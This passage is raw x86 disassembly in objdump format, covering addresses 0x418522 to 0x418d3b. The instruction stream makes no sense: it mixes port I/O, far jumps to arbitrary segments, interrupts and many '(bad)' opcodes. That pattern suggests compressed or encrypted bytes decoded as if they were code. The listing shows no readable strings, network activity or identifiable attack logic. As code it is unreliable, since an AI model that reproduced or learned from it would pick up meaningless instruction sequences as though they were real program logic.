  418522:	imul   esp,DWORD PTR [eax+0x3a214e5f],0x40
  418529:	pop    esp
  41852a:	sbb    BYTE PTR [esi+0x41],0x3
  41852e:	and    BYTE PTR [ebp-0x187ec2fc],ah
  418534:	mov    al,0x40
  418536:	or     bh,ah
  418538:	sahf   
  418539:	fisubr WORD PTR [ebp+0x6c06b359]
  41853f:	add    DWORD PTR [esi],0x52
  418542:	lea    edi,[ebx-0x77]
  418545:	in     eax,0x93
  418547:	jge    0x4185b0
  418549:	sbb    DWORD PTR [ebp+ecx*2+0x7ca05cf6],ebp
  418550:	imul   esi,DWORD PTR [ecx],0xffffffda
  418553:	add    esi,DWORD PTR [ebx-0x72]
  418556:	xlat   BYTE PTR ds:[ebx]
  418557:	cmp    BYTE PTR [eax],0x23
  41855a:	xor    BYTE PTR [ebp+0xe],bl
  41855d:	fwait
  41855e:	test   DWORD PTR [eax-0x40],ebp
  418561:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418563:	(bad)  
  418564:	pop    esi
  418565:	cmp    eax,esp
  418567:	jmp    0xe0f2:0x1bc7a227
  41856e:	ds repz mov esi,0xe97dbb0a
  418575:	inc    eax
  418576:	sub    eax,0x1a25c233
  41857b:	mul    esi
  41857d:	and    BYTE PTR [edx],al
  41857f:	nop
  418580:	inc    ebx
  418581:	mov    dl,0x52
  418583:	test   ebp,edi
  418585:	add    al,bl
  418587:	jge    0x418536
  418589:	cmp    esp,DWORD PTR ds:0x19c36d67
  41858f:	push   eax
  418590:	mov    cl,0xf3
  418592:	jo     0x4185aa
  418594:	mov    ch,0x73
  418596:	test   ecx,esp
  418598:	cs sahf 
  41859a:	in     eax,dx
  41859b:	adc    al,0xe9
  41859d:	test   eax,0x14a897e9
  4185a2:	fsubr  DWORD PTR ds:[ebx+0x1bb8dd84]
  4185a9:	in     eax,dx
  4185aa:	sbb    ecx,DWORD PTR [ecx+ecx*1-0x8]
  4185ae:	js     0x41855b
  4185b0:	out    0xda,eax
  4185b2:	sub    DWORD PTR [edx-0x7bb80803],edi
  4185b8:	popa   
  4185b9:	cdq    
  4185ba:	jl     0x418631
  4185bc:	jae    0x41857b
  4185be:	jmp    0xee54:0xc9b10a
  4185c5:	xchg   edi,eax
  4185c6:	enter  0x9240,0x99
  4185ca:	cmp    edx,esi
  4185cc:	rcr    BYTE PTR [eax+0x50],cl
  4185cf:	jge    0x41859f
  4185d1:	jo     0x418589
  4185d3:	jg     0x4185ba
  4185d5:	arpl   bx,dx
  4185d7:	(bad)  
  4185d8:	sbb    BYTE PTR [edi-0x3d023dff],al
  4185de:	lds    esp,FWORD PTR [esi+0x60308f7b]
  4185e4:	or     al,0xd8
  4185e6:	fwait
  4185e7:	mov    eax,ds:0x1ff6245f
  4185ec:	mov    ds,edi
  4185ee:	div    BYTE PTR [edx]
  4185f0:	add    bl,BYTE PTR [ebx-0x36]
  4185f3:	xchg   esi,eax
  4185f4:	sub    BYTE PTR [esi+edx*2-0x6b426fbb],bh
  4185fb:	pop    edx
  4185fc:	test   eax,0x23e5a886
  418601:	iret   
  418602:	mov    al,0x6
  418604:	dec    ecx
  418605:	frstor fs:[ebx]
  418608:	mov    edi,0x1dd36357
  41860d:	sub    eax,0x5912c52a
  418612:	adc    al,0x9c
  418614:	pop    ecx
  418615:	push   eax
  418616:	and    al,0xce
  418618:	je     0x418658
  41861a:	addr16 or edx,esp
  41861d:	int    0xe2
  41861f:	mov    esi,0x3585cc68
  418624:	sub    eax,0x354b4ea7
  418629:	pop    es
  41862a:	jmp    0x265ef71c
  41862f:	test   esp,esp
  418631:	(bad)  
  418632:	loopne 0x418648
  418634:	xor    ebx,ebx
  418636:	jnp    0x41864e
  418638:	xor    esp,DWORD PTR [esi-0x2e124c63]
  41863e:	ret    0xb679
  418641:	repz mov ebp,0x8d631f19
  418647:	and    eax,edi
  418649:	dec    ebx
  41864b:	xchg   esp,eax
  41864c:	inc    eax
  41864d:	jmp    0xa9f70551
  418652:	push   ss
  418653:	sbb    al,0xc5
  418655:	cmp    ecx,DWORD PTR [edx-0x28]
  418658:	cli    
  418659:	sbb    al,0xd1
  41865b:	push   cs
  41865c:	cs in  eax,0x34
  41865f:	hlt    
  418660:	sub    BYTE PTR [eax-0x1432ea60],bl
  418666:	add    BYTE PTR [eax],bh
  418668:	jmp    0x41864c
  41866a:	pushf  
  41866b:	in     al,0xf3
  41866d:	pop    esp
  41866e:	inc    edx
  41866f:	mov    eax,0xbdec8f2f
  418674:	inc    eax
  418675:	xchg   BYTE PTR [esi],bl
  418677:	mov    esp,0x282195e3
  41867c:	outs   dx,DWORD PTR ds:[esi]
  41867d:	lahf   
  41867e:	mov    al,BYTE PTR [edi+0x31e93a3]
  418684:	sahf   
  418685:	sub    ah,BYTE PTR [eax-0x72]
  418688:	xchg   BYTE PTR [ebp+0x6295183],bl
  41868e:	out    dx,al
  41868f:	sub    eax,0xbf14332c
  418694:	lods   eax,DWORD PTR ds:[esi]
  418695:	xlat   BYTE PTR ds:[ebx]
  418696:	fxch   st(2)
  418698:	jge    0x418701
  41869a:	fadd   DWORD PTR [ebp+0x36]
  41869d:	jle    0x41869c
  41869f:	push   ecx
  4186a0:	stc    
  4186a1:	pusha  
  4186a2:	inc    esi
  4186a3:	inc    ebx
  4186a4:	in     al,0x6b
  4186a6:	mov    eax,0x7dfb8fcc
  4186ab:	xchg   esi,eax
  4186ac:	mov    al,0xe6
  4186ae:	pop    ds
  4186af:	lods   eax,DWORD PTR ds:[esi]
  4186b0:	and    bl,BYTE PTR [ecx+0x203e9d01]
  4186b6:	push   cs
  4186b7:	sbb    eax,0x7edf0c5a
  4186bc:	iret   
  4186bd:	or     eax,0xbb7b6ee0
  4186c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186c3:	push   cs
  4186c4:	inc    edx
  4186c5:	loopne 0x418716
  4186c7:	sub    eax,0x250c7c47
  4186cc:	sbb    esp,DWORD PTR [esi]
  4186ce:	push   ebx
  4186cf:	retf   0x2e97
  4186d2:	mov    BYTE PTR [edx+0x20c0cb7d],cl
  4186d8:	mov    ss:0x6f7878a1,al
  4186de:	dec    eax
  4186df:	js     0x4186bb
  4186e1:	jmp    0xa4da3b
  4186e6:	icebp  
  4186e7:	inc    edi
  4186e8:	jmp    DWORD PTR [edi-0x6b]
  4186eb:	dec    edx
  4186ec:	fist   DWORD PTR [edi+0x343d3c84]
  4186f2:	xor    ebp,DWORD PTR [esi+0x5afda27a]
  4186f8:	sbb    al,0x98
  4186fa:	sbb    al,0xcf
  4186fc:	out    dx,al
  4186fd:	jg     0x41873a
  4186ff:	jb     0x4186c7
  418701:	push   eax
  418702:	(bad)  
  418703:	mov    eax,ds:0xe2529d2a
  418708:	dec    ebp
  418709:	and    eax,0xa6d70420
  41870e:	xchg   ecx,eax
  41870f:	(bad)  
  418710:	scas   eax,DWORD PTR es:[edi]
  418711:	stos   DWORD PTR es:[edi],eax
  418712:	test   DWORD PTR [esi-0x18],esp
  418715:	popa   
  418716:	cmp    bh,dl
  418718:	cmp    ch,bl
  41871a:	outs   dx,BYTE PTR ds:[esi]
  41871b:	sub    esi,DWORD PTR [edi+0x7f]
  41871e:	mov    edx,0x32475a9b
  418723:	iret   
  418724:	jnp    0x41875a
  418726:	inc    ebp
  418727:	pusha  
  418728:	xor    ch,bh
  41872a:	into   
  41872b:	imul   esi,DWORD PTR [esi],0x3cf3a07f
  418731:	mov    WORD PTR [esi+0x5ffa8701],ss
  418737:	xchg   edi,eax
  418738:	cld    
  418739:	pop    edi
  41873a:	adc    DWORD PTR ds:0x5390484a,edx
  418740:	pop    edx
  418741:	daa    
  418742:	ret    0xe822
  418745:	dec    ebp
  418746:	pop    ss
  418747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418748:	add    ebp,ebp
  41874a:	mov    ah,0xc8
  41874c:	sbb    BYTE PTR [eax-0x253ca53c],bl
  418752:	sub    cl,BYTE PTR [esi+edi*8]
  418755:	das    
  418756:	mov    eax,0xd1b4f623
  41875b:	lahf   
  41875c:	std    
  41875d:	xor    BYTE PTR [esi+0x2],0x92
  418761:	push   cs
  418762:	jle    0x418728
  418764:	popf   
  418765:	mov    ecx,0xc10d7033
  41876a:	sbb    ah,dl
  41876c:	les    esi,FWORD PTR [edx]
  41876e:	add    DWORD PTR [eax],edi
  418770:	out    0xfd,al
  418772:	or     dh,ah
  418774:	or     esi,edi
  418776:	outs   dx,DWORD PTR ds:[esi]
  418777:	mov    ds:0x7f5f2869,eax
  41877c:	adc    al,0xcc
  41877e:	lock retf 0xc2e7
  418782:	cmp    eax,0x9ce479dc
  418787:	adc    eax,ebp
  418789:	mov    dl,0xab
  41878b:	dec    esp
  41878c:	fcmovbe st,st(7)
  41878e:	ret    0x7f4d
  418791:	pushf  
  418792:	add    BYTE PTR [ebp+ebx*2-0x443bfcea],dh
  418799:	data16 cmc 
  41879b:	sbb    eax,0x761e2dbb
  4187a0:	add    ah,ah
  4187a2:	mov    cl,0x15
  4187a4:	fisubr WORD PTR [ecx+eiz*4]
  4187a7:	pushf  
  4187a8:	(bad)  
  4187a9:	fst    QWORD PTR [edx]
  4187ab:	cmp    edi,ebx
  4187ad:	xor    cl,BYTE PTR [eax+0x7cda86e0]
  4187b3:	sbb    bl,ah
  4187b5:	adc    DWORD PTR [esi],0xffffffcf
  4187b8:	out    dx,ax
  4187ba:	sub    ebp,DWORD PTR ds:0x98277324
  4187c0:	icebp  
  4187c1:	mov    edx,DWORD PTR [esi+0x2a9bf854]
  4187c7:	fdiv   QWORD PTR ds:0x7163973b
  4187cd:	ins    BYTE PTR es:[edi],dx
  4187ce:	jle    0x418795
  4187d0:	mov    dl,0x3a
  4187d2:	int    0xe5
  4187d4:	mov    al,ds:0x5945ba92
  4187d9:	rcl    DWORD PTR [edi+edx*4],1
  4187dc:	jmp    0xf5ce:0x113a4d67
  4187e3:	push   0xab3978c4
  4187e8:	push   0xfa9eeebc
  4187ed:	ret    
  4187ee:	cmp    dh,BYTE PTR [ebp+edi*1-0x29]
  4187f2:	call   0xf5f9:0x151c654e
  4187f9:	(bad)  
  4187fa:	test   al,0x9a
  4187fc:	or     al,0xba
  4187fe:	inc    esi
  4187ff:	xchg   esi,eax
  418800:	sbb    dh,bh
  418802:	push   esi
  418803:	leave  
  418804:	and    DWORD PTR [esi+0x53],ebx
  418807:	and    eax,esp
  418809:	rol    DWORD PTR [eax],cl
  41880b:	push   esp
  41880c:	shr    DWORD PTR [ebx-0x11],cl
  41880f:	ret    0x5e9f
  418812:	pop    ebx
  418813:	mov    ebp,0xf49298d6
  418818:	jp     0x41886d
  41881a:	arpl   bx,bx
  41881c:	shl    DWORD PTR [ecx+ecx*1-0x40],1
  418820:	repz dec esi
  418822:	xchg   DWORD PTR [edx-0x27d84af9],esi
  418828:	jb     0x4188a5
  41882a:	sbb    ebx,DWORD PTR [ebp-0x1e6e382d]
  418830:	or     al,0x5d
  418832:	test   DWORD PTR [ecx+0x9469ff4],ecx
  418838:	into   
  418839:	loopne 0x4187f3
  41883b:	out    0x22,al
  41883d:	test   ch,0x8f
  418840:	add    esp,esp
  418842:	inc    esi
  418843:	aaa    
  418844:	shr    DWORD PTR [esi],1
  418846:	es icebp 
  418848:	(bad)  
  418849:	cli    
  41884a:	inc    edi
  41884b:	push   0x60
  41884d:	cdq    
  41884e:	repz mov eax,0xe3a6a37c
  418854:	in     al,0xac
  418856:	or     dl,BYTE PTR [ecx+ecx*8]
  418859:	push   esi
  41885a:	xor    eax,0x30f539b1
  41885f:	and    eax,0xddbe5b19
  418864:	ins    BYTE PTR es:[edi],dx
  418865:	jmp    0xb56fad2f
  41886a:	test   eax,0x5e9523c
  41886f:	jle    0x418804
  418871:	xchg   esi,eax
  418872:	jmp    0xbcece7d4
  418877:	cld    
  418878:	and    ebp,DWORD PTR ds:0x1e61fd17
  41887e:	dec    ebp
  41887f:	dec    eax
  418880:	outs   dx,BYTE PTR ds:[esi]
  418881:	cmp    edx,esp
  418883:	sub    eax,0x1a2dff8d
  418888:	sbb    eax,0x16800126
  41888d:	xor    al,BYTE PTR [edx]
  41888f:	jmp    0xd166b50c
  418894:	sahf   
  418895:	push   ebx
  418896:	xchg   BYTE PTR [ecx+0x77],ch
  418899:	jae    0x4188fe
  41889b:	adc    bl,bh
  41889d:	sub    ebx,edi
  41889f:	aas    
  4188a0:	dec    edx
  4188a1:	outs   dx,BYTE PTR ds:[esi]
  4188a2:	push   esp
  4188a3:	xor    BYTE PTR [edi],al
  4188a5:	outs   dx,BYTE PTR ds:[esi]
  4188a6:	enter  0xe457,0x8c
  4188aa:	sar    BYTE PTR [eax+0x70250289],cl
  4188b0:	xchg   edx,eax
  4188b1:	dec    ecx
  4188b2:	mov    dh,BYTE PTR [edx+0x2144a21d]
  4188b8:	(bad)  [esi+ebp*4-0x31]
  4188bc:	out    dx,eax
  4188bd:	into   
  4188be:	xchg   BYTE PTR [edi-0x5e1a8be4],bl
  4188c4:	adc    al,0x74
  4188c6:	push   ss
  4188c7:	inc    eax
  4188c8:	and    al,0xa1
  4188ca:	cmc    
  4188cb:	push   es
  4188cc:	ret    
  4188cd:	inc    ax
  4188cf:	sti    
  4188d0:	lds    ecx,FWORD PTR [edx-0x37]
  4188d3:	adc    bh,BYTE PTR [esi-0x5371bb4b]
  4188d9:	xchg   edx,eax
  4188da:	pop    es
  4188db:	xor    eax,0x77650cb8
  4188e0:	lahf   
  4188e1:	mov    esp,0x92ac7368
  4188e6:	cli    
  4188e7:	sbb    al,0x33
  4188e9:	shl    BYTE PTR [ebp+0x48],cl
  4188ec:	(bad)  
  4188ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ef:	test   ebx,esp
  4188f1:	mov    ecx,0xc8c09e9d
  4188f6:	clc    
  4188f7:	inc    ebp
  4188f8:	nop
  4188f9:	into   
  4188fa:	push   ebp
  4188fb:	cmp    al,0x25
  4188fd:	outs   dx,DWORD PTR ds:[esi]
  4188fe:	push   es
  4188ff:	int3   
  418900:	jp     0x4188e3
  418902:	and    eax,0xf188419c
  418907:	xchg   edx,eax
  418908:	out    0xc,al
  41890a:	mov    edi,0x8cf610eb
  41890f:	and    dh,dl
  418911:	mov    edx,0x5b6bf34b
  418916:	cmp    ebp,DWORD PTR [ebx+ebx*4-0x7523bacc]
  41891d:	adc    al,0x37
  41891f:	cmp    DWORD PTR es:[eax-0x23bbe68],edi
  418926:	fimul  DWORD PTR [edx]
  418928:	shr    DWORD PTR [esi],0x86
  41892b:	lds    edx,FWORD PTR [edx-0x23]
  41892e:	gs cmp al,ch
  418931:	or     esp,DWORD PTR [ecx]
  418933:	or     eax,DWORD PTR [ebx-0x414b8f71]
  418939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41893a:	pop    ebx
  41893b:	test   eax,0x64b673a0
  418940:	test   DWORD PTR [ebp-0x45289cb5],ecx
  418946:	pop    ds
  418947:	aad    0xa6
  418949:	push   esi
  41894a:	sbb    eax,0xfb67262a
  41894f:	popf   
  418950:	arpl   WORD PTR [edi],sp
  418952:	mov    ah,0x5a
  418954:	sbb    esp,edx
  418956:	rcl    eax,0x3
  418959:	ror    BYTE PTR ss:[edx-0x47],cl
  41895d:	shl    BYTE PTR [ebp+0x651d8404],0x2d
  418964:	sub    BYTE PTR [eax-0x7e],cl
  418967:	(bad)  
  418968:	imul   edi,ecx,0x74
  41896b:	push   ds
  41896c:	dec    ebx
  41896d:	pop    es
  41896e:	and    BYTE PTR [ebx],al
  418970:	aas    
  418971:	in     al,0x31
  418973:	mov    eax,0x7bc34f5f
  418978:	arpl   WORD PTR [edx-0x782ef203],si
  41897e:	xchg   esi,eax
  41897f:	outs   dx,BYTE PTR ds:[esi]
  418980:	dec    ebp
  418981:	fisttp QWORD PTR [esi-0x634b58d3]
  418987:	ficomp WORD PTR [ecx+ebx*2+0x3d32ca8d]
  41898e:	pop    ss
  41898f:	jae    0x418918
  418991:	sub    al,0xf5
  418993:	jae    0x41896d
  418995:	xor    al,ch
  418997:	(bad)  
  418998:	xor    al,0x86
  41899a:	jge    0x418987
  41899c:	hlt    
  41899d:	push   es
  41899e:	push   eax
  41899f:	loopne 0x418994
  4189a1:	mov    DWORD PTR [eax-0x11],ebp
  4189a4:	jge    0x41896d
  4189a6:	xor    eax,0xc4be3e42
  4189ab:	mov    esi,0x41fe1d65
  4189b0:	adc    DWORD PTR [ebx+0x6d5657d2],edx
  4189b6:	mov    ebx,0xa9894a13
  4189bb:	mov    dl,0x5f
  4189bd:	int    0xa6
  4189bf:	cmp    BYTE PTR [ebp+0x3],bl
  4189c2:	lahf   
  4189c3:	cmp    al,0xcf
  4189c5:	jns    0x4189df
  4189c7:	js     0x4189ce
  4189c9:	shr    DWORD PTR [edi],1
  4189cb:	and    eax,0x791187c7
  4189d0:	sub    al,0x4b
  4189d2:	push   0x19
  4189d4:	jns    0x418966
  4189d6:	pop    ds
  4189d7:	jo     0x418965
  4189d9:	arpl   di,cx
  4189db:	sbb    eax,0x5357e209
  4189e0:	std    
  4189e1:	sti    
  4189e2:	repnz or ecx,DWORD PTR [edx+0x4df4f04e]
  4189e9:	adc    al,0x1d
  4189eb:	jae    0x418991
  4189ed:	xor    ecx,edx
  4189ef:	cmp    al,0x33
  4189f1:	cwde   
  4189f2:	sbb    DWORD PTR [ecx+0xc238da2],ecx
  4189f8:	int3   
  4189f9:	(bad)  
  4189fa:	mov    ebp,0x4a646ec7
  4189ff:	push   ecx
  418a00:	sbb    bl,ch
  418a02:	and    bl,cl
  418a04:	(bad)  
  418a05:	sti    
  418a06:	hlt    
  418a07:	sbb    BYTE PTR [eax],al
  418a09:	mov    edx,0x9384db78
  418a0e:	cwde   
  418a0f:	pop    esi
  418a10:	push   0x12
  418a12:	xchg   ebx,eax
  418a13:	xor    BYTE PTR [edx+esi*8-0x24028411],dh
  418a1a:	mov    dh,0xe7
  418a1c:	stos   DWORD PTR es:[edi],eax
  418a1d:	jmp    0xcc28:0x2ae71895
  418a24:	sbb    bl,BYTE PTR [edx]
  418a26:	int    0x1f
  418a28:	retf   
  418a29:	mov    eax,ds:0x5df51d27
  418a2e:	ds ret 0xa01f
  418a32:	frstor [esi+0x22344a7f]
  418a38:	test   DWORD PTR [esi+0x63],ecx
  418a3b:	jp     0x418a19
  418a3d:	mov    dl,0x33
  418a3f:	(bad)  cs:0xd8783277
  418a46:	and    ch,BYTE PTR [ecx]
  418a48:	and    bl,BYTE PTR cs:[ebx-0x1f248744]
  418a4f:	adc    ax,WORD PTR es:[edx+esi*4]
  418a54:	popa   
  418a55:	imul   esp,DWORD PTR [esi+eiz*4-0x6b],0x6d
  418a5a:	(bad)  
  418a5b:	outs   dx,BYTE PTR ds:[esi]
  418a5c:	sub    al,0xc9
  418a5e:	dec    ebp
  418a5f:	mov    ebx,0xa4a54cb4
  418a64:	pop    esp
  418a65:	adc    BYTE PTR [ebp-0x15b90613],cl
  418a6b:	sbb    ebp,DWORD PTR [edi]
  418a6d:	das    
  418a6e:	jg     0x418acc
  418a70:	stos   DWORD PTR es:[edi],eax
  418a71:	call   0x2de4:0x4f2a265b
  418a78:	or     ecx,DWORD PTR ds:0xca8dade5
  418a7e:	adc    DWORD PTR [ecx-0x2c8d00df],eax
  418a84:	ret    0xb4a6
  418a87:	loope  0x418a74
  418a89:	sahf   
  418a8a:	es iret 
  418a8c:	dec    ebp
  418a8d:	and    bl,BYTE PTR [ebx+0xb1e3ecd]
  418a93:	je     0x418ae2
  418a95:	retf   0x3d83
  418a98:	or     al,0x2c
  418a9a:	pop    edx
  418a9b:	cmp    BYTE PTR ds:0x82aae79d,ch
  418aa1:	cmp    cl,BYTE PTR [ebx]
  418aa3:	iret   
  418aa4:	jne    0x418b09
  418aa6:	push   cs
  418aa7:	fucomip st,st(4)
  418aa9:	jne    0x418a4c
  418aab:	sub    eax,0x2c51678a
  418ab0:	and    DWORD PTR [edi-0x621e5e8d],edx
  418ab6:	ftst   
  418ab8:	push   ebx
  418ab9:	mov    edi,0x5ec6c239
  418abe:	fidivr WORD PTR [eax-0x4404a7a8]
  418ac4:	sar    DWORD PTR [ebx+0x78928866],1
  418aca:	mov    esi,0x9d21ee81
  418acf:	adc    eax,0xc0a84700
  418ad4:	in     eax,0x1b
  418ad6:	dec    ebx
  418ad7:	ror    edx,1
  418ad9:	xchg   esi,eax
  418ada:	loopne 0x418a9c
  418adc:	or     BYTE PTR [edx-0x5f4c73b1],cl
  418ae2:	inc    ecx
  418ae3:	leave  
  418ae4:	cld    
  418ae5:	jns    0x418b4f
  418ae7:	push   eax
  418ae8:	sbb    DWORD PTR [edi+0x17],ebp
  418aeb:	aaa    
  418aec:	xor    dh,0xb1
  418aef:	inc    ebx
  418af0:	mov    eax,ds:0x143f4024
  418af5:	(bad)  
  418af6:	push   cs
  418af7:	mov    DWORD PTR [ebx+eiz*4-0x3b],eax
  418afb:	push   ebx
  418afc:	aaa    
  418afd:	fadd   st,st(5)
  418aff:	adc    eax,0xfe0b4d69
  418b04:	and    eax,0x349d92b
  418b09:	dec    ebp
  418b0a:	mov    ecx,0x7b2a62e6
  418b0f:	mov    dl,0x88
  418b11:	mov    DWORD PTR [ecx],edi
  418b13:	cmp    al,0xc8
  418b15:	mov    ds:0x6eb16b5b,eax
  418b1a:	ds stos DWORD PTR es:[edi],eax
  418b1c:	sbb    ah,0xf0
  418b1f:	(bad)  [edi+0x77]
  418b22:	inc    ecx
  418b23:	addr16 sbb eax,0x9b5366a1
  418b29:	inc    eax
  418b2a:	cs call 0xe6bc:0x9384fc21
  418b32:	sbb    ecx,ebp
  418b34:	jmp    0x418b31
  418b36:	ins    BYTE PTR es:[edi],dx
  418b37:	cmp    al,0x6b
  418b39:	test   eax,0x9705999a
  418b3e:	pop    esp
  418b3f:	pop    ss
  418b40:	or     dh,BYTE PTR [ebx-0x7ef0f6b5]
  418b46:	neg    dh
  418b48:	jns    0x418b9e
  418b4a:	popa   
  418b4b:	jle    0x418ad8
  418b4d:	enter  0x5d0e,0x7c
  418b51:	test   BYTE PTR [eax-0x2927a288],ah
  418b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b58:	mov    ch,0x22
  418b5a:	jo     0x418b2f
  418b5c:	shl    DWORD PTR [edi-0x4bbff8d1],1
  418b62:	lods   al,BYTE PTR ds:[esi]
  418b63:	adc    edi,eax
  418b65:	out    dx,al
  418b66:	xor    al,dl
  418b68:	in     eax,dx
  418b69:	ffree  st(5)
  418b6b:	pop    eax
  418b6c:	icebp  
  418b6d:	test   eax,0x945f12e4
  418b72:	push   edi
  418b73:	mov    ebx,0xa626a734
  418b78:	pop    edx
  418b79:	cmp    eax,0xcc801d59
  418b7e:	sbb    bh,BYTE PTR [edi+0x44]
  418b81:	sub    al,0xba
  418b83:	jmp    0x69b93038
  418b88:	jecxz  0x418b6e
  418b8a:	rcr    DWORD PTR [ebp+0x721b88d9],0xb0
  418b91:	pop    ebx
  418b92:	scas   eax,DWORD PTR es:[edi]
  418b93:	retf   
  418b94:	push   eax
  418b95:	mov    ds:0x30d92a7d,al
  418b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b9c:	jae    0x418b5e
  418b9e:	or     DWORD PTR ds:0xc88e4a70,0xfeed18e5
  418ba8:	dec    ebx
  418ba9:	jmp    0x418bb6
  418bab:	ss push 0x95125f9e
  418bb1:	push   ds
  418bb2:	pop    es
  418bb3:	cmp    BYTE PTR [esp+eiz*4-0x62edf286],0x25
  418bbb:	ret    0x50f7
  418bbe:	imul   eax,DWORD PTR [ebp-0x6a4ddf11],0xffffff9f
  418bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc6:	push   edi
  418bc7:	icebp  
  418bc8:	stc    
  418bc9:	mov    WORD PTR [edi+0x3bb36c0a],ss
  418bcf:	push   esi
  418bd0:	jg     0x418bc8
  418bd2:	jmp    0x418c3f
  418bd4:	xchg   edx,eax
  418bd5:	push   edi
  418bd6:	dec    esp
  418bd7:	push   edx
  418bd8:	inc    edi
  418bd9:	test   eax,0x42b59aa5
  418bde:	mov    cl,0x6a
  418be0:	mov    bl,0x6f
  418be2:	sbb    BYTE PTR [ebx-0x68],dh
  418be5:	mov    BYTE PTR [ebx+0x2a],0xb
  418be9:	jl     0x418c3e
  418beb:	xchg   ecx,eax
  418bec:	imul   ebp,DWORD PTR [esi],0xffffff9c
  418bef:	or     eax,0x96954d30
  418bf4:	out    dx,al
  418bf5:	sbb    BYTE PTR [ebx-0x6a],ah
  418bf8:	push   esi
  418bf9:	int    0xd0
  418bfb:	sub    ecx,edx
  418bfd:	sti    
  418bfe:	adc    BYTE PTR [edx-0x22],bl
  418c01:	xchg   ebx,eax
  418c02:	aad    0xe1
  418c04:	aam    0xf9
  418c06:	push   ss
  418c07:	mov    ah,0x81
  418c09:	mov    dl,0x78
  418c0b:	xor    ebx,DWORD PTR [ebx]
  418c0d:	sahf   
  418c0e:	leave  
  418c0f:	add    BYTE PTR [ebp-0x68f8f183],dh
  418c15:	pop    ebp
  418c16:	pushf  
  418c17:	jb     0x418c85
  418c19:	mov    ebp,0x64e437f4
  418c1e:	inc    esi
  418c1f:	jnp    0x418c7d
  418c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c22:	rcl    DWORD PTR [eax],1
  418c24:	cwde   
  418c25:	icebp  
  418c26:	push   DWORD PTR [edx-0x1dc6d01a]
  418c2c:	or     DWORD PTR [ecx+0x331212d7],0xffffff83
  418c33:	dec    ecx
  418c34:	inc    esi
  418c35:	mov    dl,0x60
  418c37:	xor    al,0x9a
  418c39:	addr16 (bad) 
  418c3b:	in     eax,0xb9
  418c3d:	dec    esp
  418c3e:	mov    bh,BYTE PTR [ebp+eax*2+0x15]
  418c42:	ret    0x3fe0
  418c45:	pop    edi
  418c46:	xchg   edi,eax
  418c47:	sbb    al,0xe9
  418c49:	inc    edx
  418c4a:	in     eax,0xb7
  418c4c:	xor    al,0x26
  418c4e:	mov    esi,0x95a3fdb
  418c53:	add    eax,0xd12d4dbe
  418c58:	enter  0x9bf4,0xd0
  418c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c5e:	cmp    BYTE PTR [eax-0x64791ef3],bh
  418c64:	dec    edi
  418c65:	and    al,0xa0
  418c67:	push   ecx
  418c68:	mov    ch,BYTE PTR [ecx]
  418c6a:	(bad)  
  418c6b:	mov    ds:0xb31477dc,eax
  418c70:	loopne 0x418cec
  418c72:	sbb    al,0x6f
  418c74:	loop   0x418c16
  418c76:	jns    0x418c0f
  418c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c79:	xchg   edx,eax
  418c7a:	int3   
  418c7b:	fdiv   DWORD PTR [esi-0x7a]
  418c7e:	call   0xa6caea70
  418c83:	retf   
  418c84:	sbb    eax,0x31ee82c3
  418c89:	hlt    
  418c8a:	mov    bh,0x2f
  418c8c:	xor    DWORD PTR [edx+0x90479b6],edx
  418c92:	inc    ebx
  418c93:	mov    dl,0x90
  418c95:	test   DWORD PTR [edi],edi
  418c97:	xor    eax,0xb4d5eafe
  418c9c:	cmp    al,0xd3
  418c9e:	push   0xc7014110
  418ca3:	dec    DWORD PTR [ebx+0x5e31587d]
  418ca9:	pop    ecx
  418caa:	cmp    DWORD PTR [edx],ebx
  418cac:	js     0x418cac
  418cae:	cmp    al,0xc3
  418cb0:	push   eax
  418cb1:	adc    dh,BYTE PTR [ecx]
  418cb3:	mov    BYTE PTR [edi+0x3542922b],ah
  418cb9:	test   bl,bh
  418cbb:	call   0x30cf6b53
  418cc0:	push   0x2877d842
  418cc5:	adc    dh,ah
  418cc7:	xor    DWORD PTR [edx-0x22],edi
  418cca:	inc    edi
  418ccb:	andps  xmm4,XMMWORD PTR [edx]
  418cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ccf:	add    al,0xb1
  418cd1:	sub    dh,BYTE PTR [edx]
  418cd3:	push   0xffffffc1
  418cd5:	lahf   
  418cd6:	pop    es
  418cd7:	fwait
  418cd8:	adc    DWORD PTR [esi],0xc7fbe03b
  418cde:	iret   
  418cdf:	jnp    0x418d48
  418ce1:	and    bl,BYTE PTR [edx]
  418ce3:	fnstsw WORD PTR [eax]
  418ce5:	aad    0x98
  418ce7:	xor    eax,0x12e7f364
  418cec:	adc    al,0x94
  418cee:	mov    ?,edi
  418cf0:	jge    0x418c91
  418cf2:	or     al,0x4e
  418cf4:	adc    dl,BYTE PTR [ebp-0x4a1aeb95]
  418cfa:	les    edx,FWORD PTR [edi]
  418cfc:	dec    ecx
  418cfd:	mov    eax,0x579fc773
  418d02:	inc    ecx
  418d03:	fisub  DWORD PTR [eax]
  418d05:	lea    esi,[ebp+0x354f3f8e]
  418d0b:	cdq    
  418d0c:	int3   
  418d0d:	mov    ah,0xaa
  418d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d10:	dec    ebp
  418d11:	in     eax,0x7
  418d13:	fisub  WORD PTR [edi-0x5e]
  418d16:	call   0x251f:0x33aefa37
  418d1d:	add    bl,cl
  418d1f:	push   ecx
  418d20:	inc    esp
  418d21:	jg     0x418d04
  418d23:	sbb    eax,edi
  418d25:	cwde   
  418d26:	int    0x26
  418d28:	or     al,0x74
  418d2a:	inc    edi
  418d2b:	xor    DWORD PTR [edx+0x16],edx
  418d2e:	outs   dx,BYTE PTR ds:[esi]
  418d2f:	sub    eax,0x695ed343
  418d34:	add    ecx,ebx
  418d36:	mov    DWORD PTR [eax],ebx
  418d38:	repz sbb al,0xfd
  418d3b:	jno    0x418cfb
